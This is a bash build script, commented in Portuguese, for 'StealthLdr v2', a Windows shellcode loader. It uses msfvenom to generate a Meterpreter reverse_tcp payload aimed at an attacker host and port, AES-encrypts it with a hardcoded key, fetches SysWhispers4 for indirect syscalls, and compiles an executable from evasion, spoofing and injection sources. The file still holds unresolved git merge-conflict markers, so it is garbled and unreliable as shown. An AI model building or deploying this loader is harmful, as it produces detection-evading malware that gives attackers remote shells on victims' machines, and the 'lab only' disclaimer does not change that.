#!/bin/bash
# StealthLdr v2 - Advanced Shellcode Loader 2026
# Uso: ./build.sh [LHOST] [LPORT] [output.exe]

set -e

LHOST=${1:-"172.29.117.103"}
LPORT=${2:-4444}
OUTPUT=${3:-stealthldr.exe}

echo "🚀 StealthLdr v2 - Advanced Edition (2026)"
echo "LHOST: $LHOST | LPORT: $LPORT | Output: $OUTPUT"
echo "==================================================="

# Verificações
command -v msfvenom >/dev/null 2>&1 || echo "[!] msfvenom não encontrado. Instale: sudo apt install metasploit-framework"
command -v x86_64-w64-mingw32-g++ >/dev/null 2>&1 || { echo "[!] Instale mingw-w64"; exit 1; }

# SysWhispers4 Indirect
echo "[1/6] Configurando SysWhispers4 (Indirect Syscalls)..."
if [ ! -d "SysWhispers4" ]; then
    git clone https://github.com/JoasASantos/SysWhispers4.git
fi
cd SysWhispers4 && git pull && cd ..
cd SysWhispers4
python3 syswhispers.py --preset common --method indirect -o ../syscalls
cd ..

# Shellcode
echo "[2/6] Gerando shellcode..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shellcode.bin

<<<<<<< HEAD
# 3. Encriptar shellcode (AES-256 CBC)
echo "[3/5] Encriptando shellcode com AES-256..."
=======
# AES Encryption
echo "[3/6] Encriptando shellcode AES-256..."
>>>>>>> f7355d3 (v2)
cat > encrypt.py << 'PYEOF'
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
<<<<<<< HEAD

key = b'StealthLdrKey2026AES256!!'[:32]
=======
key = b'StealthLdr2026KeyAES256!!'[:32]
>>>>>>> f7355d3 (v2)
iv = os.urandom(16)
with open('shellcode.bin', 'rb') as f: data = f.read()
cipher = AES.new(key, AES.MODE_CBC, iv)
ct = cipher.encrypt(pad(data, AES.block_size))
<<<<<<< HEAD

with open('shellcode.enc', 'wb') as f:
    f.write(iv + ct)

print(f"[+] Shellcode encriptado ({len(iv + ct)} bytes) -> shellcode.enc")
PYEOF

=======
with open('shellcode.enc', 'wb') as f: f.write(iv + ct)
print(f"[+] Shellcode encriptado ({len(iv + ct)} bytes)")
PYEOF
>>>>>>> f7355d3 (v2)
python3 encrypt.py

# Compilação
echo "[4/6] Compilando loader avançado..."
x86_64-w64-mingw32-g++ -o $OUTPUT \
    main.cpp evasion.cpp crypto.cpp spoofing.cpp injection.cpp syscalls.c aes.c \
    -I. -lntdll -static -O2 -s -fno-stack-protector -w -D_CRT_SECURE_NO_WARNINGS

rm -f shellcode.bin encrypt.py
echo "==================================================="
<<<<<<< HEAD
echo "✅ Build finalizado!"
echo "📁 Arquivo gerado: $OUTPUT"
echo ""
echo "Teste no Windows:"
echo "   .\\$OUTPUT shellcode.enc"
echo ""
echo "Boa sorte nos estudos! Use apenas em laboratório."
=======
echo "✅ Build concluído! → $OUTPUT"
echo "Teste no Windows: $OUTPUT shellcode.enc"
>>>>>>> f7355d3 (v2)
